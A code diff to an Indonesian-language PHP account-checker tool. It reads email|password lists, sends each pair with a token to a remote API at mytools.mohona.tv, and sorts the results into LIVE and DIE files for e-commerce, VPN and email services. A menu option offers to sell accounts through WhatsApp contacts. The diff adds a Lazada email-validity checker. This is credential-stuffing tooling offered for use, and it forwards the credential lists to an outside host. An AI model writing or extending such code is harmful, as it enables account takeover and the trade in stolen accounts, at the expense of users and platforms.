@@ -8,7 +8,7 @@
 		Jangan Di Utak Atik kalo gk mau error gan :)
 	*/
 
-	$version = '1.1.2';
+	$version = '1.1.3';
 
 	// error_reporting(0);
 	if (!file_exists('token.php')) {
@@ -39,6 +39,7 @@
 	
 	// SERVER
 	$server = 'http://mytools.mohona.tv/Api/';
+	
 
 	function banner()
 	{
@@ -77,6 +78,7 @@
 			echo $x;
 			exit();
 		}
+		// print_r($x);
 	}
 	function post($pilihan, $email, $pass, $token, $server, $file_txt, $die_txt)
 	{	
@@ -125,15 +127,23 @@
 				exit();
 			}
 			sleep(1);
+		}	
+	}
+
+	function post_email($pilihan, $email, $token, $server, $file_txt, $die_txt)
+	{	
+		$data = "email=$email&token=$token";
+
+		if ($pilihan == 21) {
+			post_api($server, $data, 'lazada_email_checker', $file_txt, $die_txt);
 		}
-		
 	}
 
 	function pilihan()
 	{
 		echo "\n[+] (1).PHD (2).Bukalapak (3).Tokopedia (4) JD.ID";
 		echo "\n[+] (5).IpVanish (6).HMA (7).Indihome";
-		echo "\n[+] (20).Yahoo Valid Email \n";
+		echo "\n[+] (20).Yahoo Valid Email (21). Lazada Valid Email \n";
 		echo "\n[+] (99). Mass Hashing (100). Beli Acc \n\n";
 	}
 
@@ -147,6 +157,8 @@
 		echo "\n[+] Example list : CWHKLB-U73H82-5KU7M1\n";
 	}elseif($pilihan == 99){
 		echo "\n[+] Example list : email|pass\n[+] Support Semua Hash\n";
+	}elseif($pilihan == 21){
+		echo "\n[+] Example list : email@gmail.com\n";
 	}elseif ($pilihan == 100) {
 		echo "\n\n[+] Hubungi Kontak Di Bawah Ini : \n- http://wa.me/6281215263142 && - http://wa.me/62852230516559\n\n";
 		exit();
@@ -219,6 +231,10 @@
 
 			$file_txt = 'YAHOO_LIVE_'.$rand.'.txt';
 			$die_txt = 'YAHOO_DIE_'.$rand.'.txt';	
+		}elseif($pilihan == 21){
+
+			$file_txt = 'LAZADA_LIVE_'.$rand.'.txt';
+			$die_txt = 'LAZADA_DIE_'.$rand.'.txt';	
 		}else{
 
 			echo "\n[-] Tidak Ada Pilihan Goblog !\n\n";
@@ -232,9 +248,13 @@
 
 		foreach ($file as $key) {
 			
-			$user = explode("|", $key);
-
-			post($pilihan, $user[0], $user[1], $token, $server, $file_txt, $die_txt);
+			if ($pilihan == 21) {
+				post_email($pilihan, $key, $token, $server, $file_txt, $die_txt);
+				// echo $key."\n";
+			}else{
+				$user = explode("|", $key);
+				post($pilihan, $user[0], $user[1], $token, $server, $file_txt, $die_txt);
+			}
 		}
 	}else{
 		echo "\n[-] FILE TIDAK ADA \n\n";
